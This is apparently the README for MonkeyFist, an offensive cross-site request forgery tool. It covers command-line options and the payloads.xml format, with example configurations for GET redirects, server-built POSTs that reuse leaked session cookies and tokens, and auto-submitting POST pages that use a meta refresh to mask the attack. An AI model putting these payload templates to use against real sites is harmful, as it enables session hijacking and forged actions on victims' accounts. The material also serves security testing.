MokeyFist - The Dynamic Request Forgery Attack Tool

http://hexsec.com/labs

Questions, problems, craziness feel free to email:
monkeyfist {at} hexsec {dot} com

This is a basic intro. More information may be available on the Hexsec labs page located at http://www.hexsec.com/labs

Ensure that all of the files are running in the same location MonkeyFist.py, FistLib.py, etc. Don't separate the pieces. Just unzip, run, and have fun. Whatever you do with MonkeyFist is on you. You are responsible for your own actions. MonkeyFist comes with no warrantees, guarantees, or promise that it will function :)

One thing I will say, you must know what you want your requests to look like prior to constructing them. I understand this is common sense but it just had to be said. Many of the errors you may encounter will probably have to do with the construction of the requests in the payloads.xml file. 

MonkeyFist requires lxml > 2.x
http://codespeak.net/lxml/
I may change this later if it is too much of a pain

You can install it using easy_install if you have Python Setuptools 
easy_install lxml

It may fail because it needs to build for your environment. If so, ensure you have 
libxml2
libxml2-dev
libxslt1
libxslt1-dev
and of course Python with development as well.

It should build after that assuming you have a compiler installed :) If there is a problem please let me know.

#######################
# STARTING MonkeyFist #
#######################

Run MonkeyFist from the command line and specify your running options. Only run options are specified here. Configuration options for payloads are all done in the payloads.xml file.

You need to specify a TCP port number to run the service on. Elevated privs are needed if grabbing low order ports such as port 80, but not needed for high order ports such as 8080. 

The following will perform in standard attack mode and run the service on port 8080

./MonkeyFist -p 8080 -s

Port Specification
__________________

-p - Specify TCP Port to use

Attack modes are:
_________________

-r - Random attack mode. Cycle through payloads.xml randomly. (Not Available Yet)

-s - Standard attack mode. Construct payloads based on definitions in payloads.xml

-t - Test mode. No attacks are performed, data is just logged for future viewing. (Not Available Yet)

Other Options
_____________

-a - Show about information

-h - Show help information


#######################
# Payload Definitions #
#######################

Payloads and actions are specified in the payloads.xml file. When adding data to the payloads.xml file remember that the XML has to be well formed and special chars may need to be in their html equivalents. Most commonly this would need to be done with &. So you would need to specify that as &amp; You get the point, hopefully. 

A default payload should be specified in a standard attack due to the possibility of non-match conditions.

Payload Options
_______________


<PAYLOAD n=Ó1Ó> - Payload definition with associated payload number. Payload number is used in random attacks.  
<SITE l=Óexample.com> - Site entry with associated domain. This domain is evaluated when cross-domain data is queried. This is tied to domain so www.example.com and example.com would both require an entry if needed. If the l= value is set to "defaultpayload" then this will be the specified default payload and should be put at the end of the payloads.xml file.
<METHOD> - Attack method to use (GET, POST, PAGE). This could be GET, POST construct, or PAGE attacks. GET performs a standard GET based attack using a redirect. POST construct uses leaked information to construct a POST. PAGE creates a PAGE that performs either a GET or POST based attack along with a refresh to a final destination to mask the attack. The FIXATION payload is also added, but is currently experimental, more information on this later.
<ID> - This specifies the session data to grab when constructing the payload.
<TARGET> - TARGET specifies the destination for the attack.
<HEADER> - Header to add to POST request. <HEADER> must have an associated <HEADVAL> following it. This is only used for POST construct attacks.
<HEADVAL> - Value for defined header. If this is a piece of session data, then the name that was used in the <ID> tag would be specified here minus the "=" sign. <HEADVAL> must have a previously defined <HEADER>. This is only used in POST construct attacks.
<POSTVAR> - POST Variable name.
<POSTVAL> - Value for defined POST variable. If this is a piece of session data, then the name that was used in the <ID> tag would be specified here.
<DESTINATION> - This is the destination for the meta refresh that happens during PAGE attacks.

<ATTACKTYPE> - This instructs the PAGE attack to do either a GET or POST. If POST is chosen an auto-submitting POST is created as the payload.

############
# EXAMPLES #
############
____________________
GET based Redirect
____________________

<ATTACKS>
	<PAYLOAD n="1">
		<SITE l="example1.com">
			<METHOD>GET</METHOD>
			<ID>rand=</ID>
			<ID>sess=</ID>
			<TARGET>http://example1.com/update.php?rand=&amp;sess=&amp;message=hello</TARGET>		
		</SITE>
	</PAYLOAD>
</ATTACKS>

This would evaluate all received cross-domain information from the domain example1.com, send the attacking using the GET method. This would grab values for session data rand= and sess= and add them to the attack in the defied URL in the locations specified.

---------------------
POST Construct
_____________________

<ATTACKS>
	<PAYLOAD n="2">
		<SITE l="www.example2.com">
			<METHOD>POST</METHOD>
			<ID>rand=</ID>
			<ID>sess=</ID>
			<TARGET>http://www.example2.com/update.php</TARGET>
			<HEADER>User-Agent</HEADER>
			<HEADVAL>Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.0)</HEADVAL>
			<HEADER>Cookie</HEADER>
			<HEADVAL>sess</HEADVAL>
			<POSTVAR>foo</POSTVAR>
			<POSTVAL>bar</POSTVAL>
			<POSTVAR>morefoo</POSTVAR>
			<POSTVAL>morebar</POSTVAL>
			<POSTVAR>rand</POSTVAR>
			<POSTVAL>rand</POSTVAL>
		</SITE>
	</PAYLOAD>
</ATTACKS>

This attack would construct a POST request based on information received in cross-domain data. Keep in mind the tool itself creates the POST, not the user's browser. This is typically only useful if someone leaks enough session data for this to be successful without the user's browser performing it. URL is the location to send the POST information to. HEADER is the specified HEADER name and HEADVAL is the associated value for the defined header. If using session data from ID then the value minus the "=" would be specified. POSTVAR is the post variable name and POSTVAL is the associated value. If session data from ID is used, the value minus the = would be used in the POSTVAL.

______________________
PAGE GET
______________________

<ATTACKS>
	<PAYLOAD n="3">
		<SITE l="example3.com">
			<METHOD>PAGE</METHOD>
			<ID>token=</ID>
			<ATTACKTYPE>GET</ATTACKTYPE>
			<TARGET>http://example3.com/test.php?token=</TARGET>
			<DESTINATION>http://www.youtube.com/watch?v=ZA1NoOOoaNwm</DESTINATION>
		</SITE>
	</PAYLOAD>
</ATTACKS>

This attack constructs a dynamic page with associated session data. ATTACKTYPE is the specification of the page doing a GET or POST based attack. URL is the destination to send the attack to. DESTINATION is the location of the meta refresh that happens.

-----------------------
PAGE POST
_______________________

<ATTACKS>
	<PAYLOAD n="4">
		<SITE l="www.example4.com">
			<METHOD>PAGE</METHOD>
			<ID>token=</ID>
			<TARGET>http://www.example4.com/foo.php</TARGET>
			<DESTINATION>http://www.youtube.com/watch?v=ZA1NoOOoaNw</DESTINATION>
			<ATTACKTYPE>POST</ATTACKTYPE>
			<POSTVAR>foo</POSTVAR>
			<POSTVAL>bar</POSTVAL>
			<POSTVAR>morefoo</POSTVAR>
			<POSTVAL>morebar</POSTVAL>
			<POSTVAR>token</POSTVAR>
			<POSTVAL>token</POSTVAL>
		</SITE>
	</PAYLOAD>
</ATTACKS>

This attack constructs a page with an auto-submitting POST that does a refresh to a final destination. 

-----------------------
Default payload
_______________________

<ATTACKS>
	<PAYLOAD n="5">
		<SITE l="defaultpayload">
			<TARGET>http://www.india-forums.com/images/actor/prabhu_deva.jpg</TARGET>
		</SITE>
	</PAYLOAD>
</ATTACKS>

Simple default payload that will happen if no match conditions exist. This one just grabs and imaage and returns it to the user's browser.

-----------------------
Fixation Example coming soon
_______________________

########################
# Questions / Problems #
########################

It's totally possible that during the creation of this program things got messed up, could be done better, or are just blatantly wrong. If that is the case send an email and feel free to say how stupid I am and say how things could be done better. Keep in mind this app started just doing a simple PoC and moved on from there. So there hasn't been any time to make things better as of yet :)

Feel free to send questions as well to:
monkeyfist {at} hexsec {dot} com